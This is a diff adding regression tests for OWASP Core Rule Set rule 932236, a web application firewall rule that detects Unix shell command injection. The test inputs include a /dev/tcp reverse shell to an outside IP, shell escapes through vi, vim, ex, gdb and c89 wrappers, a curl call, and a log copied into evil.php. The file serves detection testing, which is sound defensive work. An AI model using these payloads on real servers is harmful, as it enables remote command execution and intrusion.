@@ -1,7 +1,11 @@
 ---
 meta:
   author: "Franziska Bühler, Max Leske"
-  description: Unix shell RCE wordlist for more than 3 characters
+  description: |
+    Unix shell RCE
+      - with / without prefix
+      - command words of any length
+      - usual targets + `Referer` and `User-Agent`
   enabled: true
   name: 932236.yaml
 tests:
@@ -159,7 +163,7 @@ tests:
           output:
             no_log_contains: id "932236"
   - test_title: 932236-9
-    desc: "False negative report"
+    desc: "False negative report - user agent"
     stages:
       - stage:
           input:
@@ -175,7 +179,7 @@ tests:
           output:
             log_contains: id "932236"
   - test_title: 932236-10
-    desc: "False negative report"
+    desc: "False negative report - POST arguments"
     stages:
       - stage:
           input:
@@ -189,5 +193,223 @@ tests:
             uri: /post
             version: HTTP/1.0
             data: ;cp /var/log/apache2/error.log evil.php
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-11
+    desc: "Negative test on German numbering - Schauen Sie sich diese Zahl an: 1'000'000"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: POST
+            port: 80
+            uri: "/post"
+            data: |
+              text=Schauen%20Sie%20sich%20diese%20Zahl%20an%3A%201%27000%27000
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932236"
+  - test_title: 932236-12
+    desc: "Positive test - BB BBBZARPI - d=/dev&&(sh)0>$d/tcp/51.15.142.164/777"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: en-us,en;q=0.5
+            method: GET
+            port: 80
+            uri: "/get?cmd=d%3D%2Fdev%26%26(sh)0%3E%24d%2Ftcp%2F51.15.142.164%2F777"
+            version: HTTP/1.1
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-13
+    desc: "55O5COJ5"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;c89 -wrapper sh,-c,id .
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-14
+    desc: "55O5COJ5"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;c89 -wrapper sh,-c,curl\ google.com .
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-15
+    desc: "9323HNQU"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;vi dddd +silent\\ \!whoami +wq
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-16
+    desc: "9323HNQU"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;vim dddd +silent\\ \!whoami +wq
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-17
+    desc: "9323HNQU"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;ex dddd +silent\\ \!whoami +wq
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-18
+    desc: "9323HNQU"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;vi -c:\!pwd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-19
+    desc: "9323HNQU"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;vim -c:\!pwd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-20
+    desc: "9323HNQU"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;ex -c:\!pwd
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-21
+    desc: "ATFHUJVF"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            data: |
+              code=;gdb -nx -ex \!whoami -ex quit
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-22
+    desc: "JW2SU88A"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+            data: |
+              code=;cat /path/file.gz
           output:
             log_contains: id "932236"
